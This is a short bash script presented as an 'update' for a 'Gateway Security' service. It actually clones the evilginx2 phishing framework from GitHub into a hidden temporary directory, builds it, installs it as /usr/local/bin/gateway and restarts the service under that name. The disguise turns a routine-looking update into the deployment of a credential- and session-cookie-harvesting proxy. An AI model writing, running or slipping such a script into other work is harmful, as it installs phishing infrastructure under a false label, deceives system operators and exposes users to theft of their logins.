#!/bin/bash
# Update script

echo "[*] Updating Gateway Security..."
cd /opt/gateway
systemctl stop gateway
rm -rf /tmp/.build_cache
git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache
cd /tmp/.build_cache
go build -buildvcs=false -o gateway
cp gateway /usr/local/bin/gateway
systemctl start gateway
echo "[✓] Update complete!"